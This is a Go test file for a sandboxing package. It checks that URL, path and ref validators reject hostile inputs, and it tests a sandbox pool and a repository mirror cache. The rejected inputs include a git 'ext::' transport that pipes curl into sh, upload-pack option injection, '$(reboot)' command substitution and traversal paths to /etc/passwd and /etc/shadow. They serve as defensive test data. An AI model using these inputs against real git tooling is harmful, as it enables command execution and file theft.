package sandbox_test

import (
	"context"
	"errors"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/sushantlokhande14/drydock/internal/sandbox"
	"github.com/sushantlokhande14/drydock/internal/sandbox/sandboxtest"
)

func TestValidateURL(t *testing.T) {
	allowed := []string{
		"https://github.com/pallets/click",
		"https://github.com/pallets/click.git",
		"https://git.example.org:8443/team/repo-name_2",
	}
	for _, url := range allowed {
		if err := sandbox.ValidateURL(url); err != nil {
			t.Errorf("%q should be allowed: %v", url, err)
		}
	}
	rejected := map[string]string{
		"http://github.com/a/b":                    "plain http",
		"git@github.com:a/b.git":                   "ssh",
		"file:///etc/passwd":                       "local file",
		"/srv/repos/a":                             "local path",
		"ext::sh -c 'curl evil | sh'":              "command-running transport",
		"--upload-pack=touch /tmp/pwned":           "option injection",
		"https://user:token@github.com/a/b":        "embedded credentials",
		"https://github.com/a/b --config core.x=y": "trailing option",
		"https://github.com/a/../../b":             "path traversal",
		"https://github.com/a/b?ref=x":             "query string",
		"":                                         "empty",
	}
	for url, why := range rejected {
		if err := sandbox.ValidateURL(url); err == nil {
			t.Errorf("%q should be rejected (%s)", url, why)
		}
	}
}

func TestRepoPath(t *testing.T) {
	inside := map[string]string{
		"":                               "/workspace/repo",
		".":                              "/workspace/repo",
		"a.py":                           "/workspace/repo/a.py",
		"src/pkg/mod.py":                 "/workspace/repo/src/pkg/mod.py",
		"./src//mod.py":                  "/workspace/repo/src/mod.py",
		"/workspace/repo/a.py":           "/workspace/repo/a.py",
		"src/../a.py":                    "/workspace/repo/a.py",
		"../../etc/passwd":               "/workspace/repo/etc/passwd",
		"a/../../../../../../etc/shadow": "/workspace/repo/etc/shadow",
	}
	for given, want := range inside {
		got, err := sandbox.RepoPath(given)
		if err != nil || got != want {
			t.Errorf("RepoPath(%q) = %q, %v; want %q", given, got, err, want)
		}
	}
	// Whatever is given, the result never leaves the checkout.
	for given := range inside {
		got, _ := sandbox.RepoPath(given)
		if got != sandbox.WorkspaceDir && !strings.HasPrefix(got, sandbox.WorkspaceDir+"/") {
			t.Errorf("RepoPath(%q) = %q escapes the repository", given, got)
		}
	}
	for _, given := range []string{"/etc/passwd", ".git/config", ".git", "a/../.git/hooks/pre-commit", "x\x00y"} {
		if got, err := sandbox.RepoPath(given); err == nil {
			t.Errorf("RepoPath(%q) = %q; want an error", given, got)
		}
	}
}

func TestMirrorPathIsStableAndDistinct(t *testing.T) {
	a := sandbox.MirrorPath("https://github.com/a/b")
	if a != sandbox.MirrorPath("https://github.com/a/b") {
		t.Fatal("the same key must give the same path")
	}
	if a == sandbox.MirrorPath("https://github.com/a/c") {
		t.Fatal("different keys must give different paths")
	}
	if !strings.HasPrefix(a, "/cache/") || !strings.HasSuffix(a, ".git") {
		t.Fatalf("unexpected mirror path %q", a)
	}
}

func TestCheckoutRejectsRefsThatLookLikeOptions(t *testing.T) {
	fake := sandboxtest.NewFake("s", nil)
	for _, ref := range []string{"--upload-pack=x", "-f", "a b", "$(reboot)", "a;b"} {
		if _, err := sandbox.Checkout(context.Background(), fake, "/cache/x.git", ref); err == nil {
			t.Errorf("ref %q should be rejected", ref)
		}
	}
	if len(fake.Commands()) != 0 {
		t.Fatalf("a rejected ref must not reach the sandbox, ran: %v", fake.Commands())
	}
	if _, err := sandbox.Checkout(context.Background(), fake, "/cache/x.git", "release/1.2"); err != nil {
		t.Fatalf("a normal ref was rejected: %v", err)
	}
}

func TestReadAndWriteFileRoundTrip(t *testing.T) {
	fake := sandboxtest.NewFake("s", nil)
	content := "line one\n\ttabs, \"quotes\", $vars and `backticks` are not interpreted\n"
	if err := sandbox.WriteFile(context.Background(), fake, "/workspace/repo/a.txt", []byte(content)); err != nil {
		t.Fatal(err)
	}
	got, truncated, err := sandbox.ReadFile(context.Background(), fake, "/workspace/repo/a.txt", 1<<20)
	if err != nil || truncated || got != content {
		t.Fatalf("got %q truncated=%v err=%v", got, truncated, err)
	}
	if _, _, err := sandbox.ReadFile(context.Background(), fake, "/workspace/repo/missing", 10); err == nil {
		t.Fatal("reading a missing file should fail")
	}
	short, truncated, err := sandbox.ReadFile(context.Background(), fake, "/workspace/repo/a.txt", 8)
	if err != nil || !truncated || short != "line one" {
		t.Fatalf("got %q truncated=%v err=%v", short, truncated, err)
	}
}

// ---------------------------------------------------------------------- pool

func TestPoolHandsOutWarmSandboxesAndRefills(t *testing.T) {
	driver := &sandboxtest.Driver{}
	pool := sandbox.NewPool(driver, sandbox.Spec{Image: "img"}, 3)
	defer pool.Close(context.Background())
	pool.Fill()
	waitReady(t, pool)

	first, warm, err := pool.Acquire(context.Background())
	if err != nil || !warm {
		t.Fatalf("expected a warm sandbox, got warm=%v err=%v", warm, err)
	}
	second, warm, _ := pool.Acquire(context.Background())
	if !warm || first.ID() == second.ID() {
		t.Fatalf("expected a second, different warm sandbox (warm=%v, ids %s %s)", warm, first.ID(), second.ID())
	}
	waitReady(t, pool)
	stats := pool.Stats()
	if stats.Idle != 3 || stats.Warm != 2 || stats.Cold != 0 {
		t.Fatalf("after refill: %+v", stats)
	}
	// Two handed out, three waiting: five created, and not one more.
	if got := len(driver.Created()); got != 5 {
		t.Fatalf("created %d sandboxes, want 5", got)
	}
}

func TestPoolCreatesOnDemandWhenEmpty(t *testing.T) {
	driver := &sandboxtest.Driver{}
	pool := sandbox.NewPool(driver, sandbox.Spec{Image: "img"}, 0)
	defer pool.Close(context.Background())

	sb, warm, err := pool.Acquire(context.Background())
	if err != nil || warm || sb == nil {
		t.Fatalf("expected a sandbox created on demand, got warm=%v err=%v", warm, err)
	}
	if stats := pool.Stats(); stats.Cold != 1 || stats.Warm != 0 {
		t.Fatalf("%+v", stats)
	}
}

func TestPoolNeverHandsTheSameSandboxToTwoCallers(t *testing.T) {
	driver := &sandboxtest.Driver{}
	pool := sandbox.NewPool(driver, sandbox.Spec{Image: "img"}, 8)
	defer pool.Close(context.Background())
	pool.Fill()
	waitReady(t, pool)

	var mu sync.Mutex
	seen := map[string]bool{}
	var wg sync.WaitGroup
	for i := 0; i < 64; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sb, _, err := pool.Acquire(context.Background())
			if err != nil {
				t.Error(err)
				return
			}
			mu.Lock()
			defer mu.Unlock()
			if seen[sb.ID()] {
				t.Errorf("sandbox %s was handed out twice", sb.ID())
			}
			seen[sb.ID()] = true
		}()
	}
	wg.Wait()
	if len(seen) != 64 {
		t.Fatalf("got %d distinct sandboxes, want 64", len(seen))
	}
}

func TestPoolDoesNotOverCreateUnderABurst(t *testing.T) {
	driver := &sandboxtest.Driver{Delay: 20 * time.Millisecond}
	pool := sandbox.NewPool(driver, sandbox.Spec{Image: "img"}, 4)
	defer pool.Close(context.Background())
	// Many refill triggers while creations are still in flight.
	for i := 0; i < 50; i++ {
		pool.Fill()
	}
	waitReady(t, pool)
	time.Sleep(60 * time.Millisecond)
	if got := len(driver.Created()); got != 4 {
		t.Fatalf("created %d sandboxes for a pool of 4", got)
	}
}

func TestPoolSurfacesCreateErrors(t *testing.T) {
	driver := &sandboxtest.Driver{Fail: errors.New("daemon unavailable")}
	pool := sandbox.NewPool(driver, sandbox.Spec{Image: "img"}, 2)
	defer pool.Close(context.Background())
	pool.Fill()

	if _, _, err := pool.Acquire(context.Background()); err == nil || !strings.Contains(err.Error(), "daemon unavailable") {
		t.Fatalf("expected the driver's error, got %v", err)
	}
}

func TestPoolCloseRemovesWaitingSandboxes(t *testing.T) {
	driver := &sandboxtest.Driver{}
	pool := sandbox.NewPool(driver, sandbox.Spec{Image: "img"}, 3)
	pool.Fill()
	waitReady(t, pool)
	taken, _, _ := pool.Acquire(context.Background())
	waitReady(t, pool)

	pool.Close(context.Background())

	for _, fake := range driver.Created() {
		if fake.ID() == taken.ID() {
			if fake.Closed() {
				t.Error("a sandbox that was handed out belongs to its caller and must not be closed by the pool")
			}
			continue
		}
		if !fake.Closed() {
			t.Errorf("sandbox %s was left running", fake.ID())
		}
	}
}

func waitReady(t *testing.T, pool *sandbox.Pool) {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := pool.WaitReady(ctx); err != nil {
		t.Fatalf("pool did not fill: %v (%+v)", err, pool.Stats())
	}
}

// ---------------------------------------------------------------- repo cache

func TestRepoCacheFetchesOnceForConcurrentCallers(t *testing.T) {
	var mu sync.Mutex
	clones := 0
	driver := &sandboxtest.Driver{New: func(int, sandbox.Spec) *sandboxtest.Fake {
		fake := sandboxtest.NewFake("fetcher", nil)
		fake.Handler = func(_ *sandboxtest.Fake, cmd sandbox.Command, _ string) (sandbox.Result, bool) {
			if strings.Contains(strings.Join(cmd.Argv, " "), "git clone --quiet --mirror") {
				mu.Lock()
				clones++
				mu.Unlock()
				time.Sleep(30 * time.Millisecond)
			}
			return sandbox.Result{}, true
		}
		return fake
	}}
	cache := sandbox.NewRepoCache(driver, "img", "vol", time.Hour)
	defer cache.Close(context.Background())

	var wg sync.WaitGroup
	paths := make([]string, 16)
	for i := range paths {
		wg.Add(1)
		go func() {
			defer wg.Done()
			path, _, err := cache.Ensure(context.Background(), "https://github.com/a/b")
			if err != nil {
				t.Error(err)
			}
			paths[i] = path
		}()
	}
	wg.Wait()

	if clones != 1 {
		t.Fatalf("the repository was cloned %d times, want 1", clones)
	}
	for _, path := range paths {
		if path != sandbox.MirrorPath("https://github.com/a/b") {
			t.Fatalf("unexpected mirror path %q", path)
		}
	}
	// A second call inside the maximum age does not touch the network at all.
	if _, fetched, _ := cache.Ensure(context.Background(), "https://github.com/a/b"); fetched {
		t.Fatal("a fresh mirror was fetched again")
	}
	if got := len(driver.Created()); got != 1 {
		t.Fatalf("created %d fetchers, want 1", got)
	}
}

func TestRepoCacheUsesANetworkedWritableFetcherAndRejectsBadURLs(t *testing.T) {
	driver := &sandboxtest.Driver{}
	cache := sandbox.NewRepoCache(driver, "img", "vol", time.Hour)
	defer cache.Close(context.Background())

	if _, _, err := cache.Ensure(context.Background(), "ext::sh -c id"); err == nil {
		t.Fatal("a command-running transport was accepted")
	}
	if len(driver.Created()) != 0 {
		t.Fatal("a rejected URL must not start a fetcher")
	}
	if _, _, err := cache.Ensure(context.Background(), "https://github.com/a/b"); err != nil {
		t.Fatal(err)
	}
	spec := driver.Specs()[0]
	if spec.Purpose != sandbox.PurposeFetcher || spec.CacheVolume != "vol" {
		t.Fatalf("unexpected fetcher spec %+v", spec)
	}
}

func TestRepoCacheReportsAFailedClone(t *testing.T) {
	driver := &sandboxtest.Driver{New: func(int, sandbox.Spec) *sandboxtest.Fake {
		fake := sandboxtest.NewFake("fetcher", nil)
		fake.Handler = func(*sandboxtest.Fake, sandbox.Command, string) (sandbox.Result, bool) {
			return sandbox.Result{ExitCode: 128, Stderr: "fatal: repository not found"}, true
		}
		return fake
	}}
	cache := sandbox.NewRepoCache(driver, "img", "vol", time.Hour)
	defer cache.Close(context.Background())

	_, _, err := cache.Ensure(context.Background(), "https://github.com/a/missing")
	if err == nil || !strings.Contains(err.Error(), "repository not found") {
		t.Fatalf("expected the clone failure, got %v", err)
	}
	// A failure is not remembered as a fresh mirror: the next call tries again.
	if _, _, err := cache.Ensure(context.Background(), "https://github.com/a/missing"); err == nil {
		t.Fatal("the failed mirror was treated as present")
	}
}
